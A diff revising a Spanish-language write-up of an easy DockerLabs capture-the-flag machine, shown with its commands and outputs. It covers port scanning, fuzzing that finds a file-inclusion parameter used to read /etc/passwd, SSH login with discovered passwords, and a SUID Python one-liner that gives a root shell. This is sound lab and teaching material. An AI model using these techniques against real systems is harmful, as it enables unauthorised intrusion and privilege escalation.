@@ -2,20 +2,26 @@ Propiedades:
 - OS: Linux
 - Plataforma: DockerLabs
 - Nivel: Easy
-- Tags: #dockerlabs #lfi #suid
+- Tags: #lfi #parameter-fuzzing #password-reuse #suid-abuse
 
 ![](assets/Pasted%20image%2020251109193730.png)
+
 ## Reconocimiento
 
-Comienzo tirando un ping para comprobar conectividad.
+Comienzo tirando un ping para comprobar la conectividad.
+
 ```bash
 > ping -c 1 172.17.0.2
+PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
+64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.827 ms
+
 --- 172.17.0.2 ping statistics ---
 1 packets transmitted, 1 received, 0% packet loss, time 0ms
 rtt min/avg/max/mdev = 0.827/0.827/0.827/0.000 ms
 ```
 
-Realizo un escaneo con nmap para ver que puertos están abiertos
+Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.
+
 ```bash
 > sudo nmap -p- --open -Pn -n -sS --min-rate 5000 172.17.0.2
 ------------------------------------------------------------
@@ -23,12 +29,12 @@ PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
 MAC Address: B6:F0:3B:69:14:E0 (Unknown)
-
 ```
 
-- Puerto 80 HTTP y 22 SSH están abiertos
+- Puertos 22 y 80 abiertos.
 
-Ahora procedo a realizar un segundo escaneo para ver mas informacion sobre las versiones y servicios que están corriendo.
+Sobre los puertos abiertos realizo un segundo escaneo más profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.
+
 ```bash
 > nmap -p 22,80 -sCV -Pn -n -sS --min-rate 5000 172.17.0.2 -oN target.txt
 --------------------------------------------------------------------------
@@ -45,22 +51,24 @@ MAC Address: B6:F0:3B:69:14:E0 (Unknown)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-- Puerto 22 SSH :  OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
-- Puerto 80 HTTP:  Apache httpd 2.4.41 ((Ubuntu))
-
+- Puerto 22 SSH OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
+- Puerto 80 HTTP Apache httpd 2.4.41 (Ubuntu)
 
 ## Enumeración
 
-**Puerto 80 HTTP**
+### Puerto 80 HTTP
 
-- Al parecer es la pagina default de apache2
+La página principal muestra la página por defecto de Apache2.
+
 ![](assets/Pasted%20image%2020251109144335.png)
 
+**Fuzzing de Directorios.**
 
-Procedí a hacer fuzzing para encontrar posibles recursos ocultos:
+Utilizo `gobuster` para descubrir posibles recursos en el servidor web.
+
 ```bash
 > gobuster dir -w raft-medium-directories.txt -u http://172.17.0.2/ -x html,php,py,js,phar,php4
-----------------------------------------------------------------------------------------------------------------------------------------------------===============================================================
+===============================================================
 Starting gobuster in directory enumeration mode
 ===============================================================
 /index.html           (Status: 200) [Size: 10918]
@@ -68,50 +76,61 @@ Starting gobuster in directory enumeration mode
 /server-status        (Status: 403) [Size: 275]
 ```
 
-Encuentro un archivo llamado _index.php_ que contiene el siguiente contenido:
+Encuentro un archivo `index.php` que contiene el siguiente mensaje:
+
 ![](assets/Pasted%20image%2020251109144427.png)
 
-Como es un servicio apache2, seguramente ya estemos en la ruta /var/www/html entonces podemos ir a buscar el archivo directamente:
+El mensaje indica que existe un archivo llamado `balu` en algún lugar del sistema. Como estamos en un servidor Apache2, la ruta por defecto es `/var/www/html`, por lo que intento acceder directamente al archivo.
+
 ![](assets/Pasted%20image%2020251109150235.png)
 
+- Encuentro la contraseña: `balu`
 
 ## Explotación
 
-La web al parecer tiene la capacidad de listarme archivos, podemos tratar de fuzzear sobr el archivo _index.php_ para descubrir algún parametro vulnerable que nos permita listar los archivos.
+### Local File Inclusion (LFI)
+
+La aplicación web parece tener capacidad para listar archivos. Decido fuzzear el archivo `index.php` para descubrir parámetros vulnerables que permitan leer archivos arbitrarios.
 
 ```bash
-ffuf -w raft-large-directories.txt:FUZZ -u http://172.17.0.2/index.php?FUZZ=/etc/passwd -fw 12
+> ffuf -w raft-large-directories.txt:FUZZ -u http://172.17.0.2/index.php?FUZZ=/etc/passwd -fw 12
 -----------------------------------------------------------------------------------------------
 page   [Status: 200, Size: 1367, Words: 11, Lines: 27, Duration: 2ms]
 ```
 
-- Descubrimos el parametro _page_
+- Descubro el parámetro `page` vulnerable a LFI.
 
-
-
-Ahora podemos listar archivos en `http://172.17.0.2/index.php?page=/etc/passwd`. Aprochandonos del parametro ?page
+Ahora puedo leer archivos del sistema accediendo a `http://172.17.0.2/index.php?page=/etc/passwd`.
 
 ![](assets/Pasted%20image%2020251109151030.png)
 
-- Vemos que existen 2 usuarios uno llamado _pinguino_ y el otro _mario_
+Del archivo `/etc/passwd` identifico dos usuarios del sistema:
+- `pinguino`
+- `mario`
 
-Ahora ya tenemos la contraeña "balu" y 2 usuarios, por lo cual podemos tratar de acceder por `SSH`.
+### Acceso SSH
 
-- pinguino:balu
+Con la contraseña `balu` encontrada anteriormente y los usuarios identificados, intento acceder por SSH.
 
 ```bash
 > ssh pinguino@172.17.0.2
----------------------------
+pinguino@172.17.0.2's password: balu
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)
+
 pinguino@dockerlabs:~$ whoami
 pinguino
 pinguino@dockerlabs:~$ id
 uid=1000(pinguino) gid=1000(pinguino) groups=1000(pinguino)
-pinguino@dockerlabs:~$ 
 ```
+
+- Acceso exitoso con las credenciales `pinguino:balu`
 
 ## Escalada de Privilegios
 
-Con el usuario _pinguino_ nos encontramos un archivo llamado nota_mario.txt que al parecer revela la contraseña del usuario mario
+### Migración al usuario mario
+
+Dentro del sistema encuentro un archivo que revela la contraseña del usuario `mario`.
+
 ```bash
 > pinguino@dockerlabs:~$ ls
 nota_mario.txt
@@ -119,26 +138,30 @@ pinguino@dockerlabs:~$ cat nota_mario.txt
 La contraseña de mario es: invitaacachopo
 ```
 
-- invitaacachopo
+- Contraseña de mario: `invitaacachopo`
 
-Por lo cual procedemos a migrar al usuario mario
+Migro al usuario `mario` con la contraseña encontrada.
+
 ```bash
 > pinguino@dockerlabs:~$ su mario
-Password: 
+Password: invitaacachopo
 mario@dockerlabs:/home/pinguino$ whoami
 mario
 ```
 
-Ahora lo que hicimos fue tratar de encontrar binarios con permisos SUID
+### Abuso de SUID para Escalada a Root
+
+Busco binarios con permisos SUID que puedan ser explotados para escalar privilegios.
+
 ```bash
 > mario@dockerlabs:/home$ find / -perm -4000 2>/dev/null
 ----------------------------------------------------------
 /usr/bin/python3.8
 ```
 
-- Encontramos el binario python que pertenece al usuario root.
+Encuentro que el binario `python3.8` tiene el bit SUID activado y pertenece a root. Esto significa que cuando se ejecuta, lo hace con los privilegios del propietario (root).
 
-Abusamos del binario `python` con ayuda de [GTFOBins](https://gtfobins.github.io/gtfobins/python/) y migramos al usuario root.
+Consulto [GTFOBins](https://gtfobins.github.io/gtfobins/python/) para encontrar formas de abusar de Python con SUID. Utilizo el siguiente comando para obtener una shell con privilegios elevados.
 
 ```bash
 > mario@dockerlabs:/home$ /usr/bin/python3.8 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
@@ -148,7 +171,10 @@ bash-5.0# id
 uid=1001(mario) gid=1001(mario) euid=0(root) groups=1001(mario)
 ```
 
-- uid=1001(mario) ← Identidad real: Soy mario euid=0(root) ← Privilegios efectivos: Actúas como root
+El output muestra:
+- `uid=1001(mario)`: Identidad real del usuario (mario)
+- `euid=0(root)`: Privilegios efectivos (root)
 
+Esto significa que aunque la identidad real sigue siendo mario, los privilegios efectivos son de root, lo que permite ejecutar comandos con permisos de superusuario.
 
 ***PWNED***
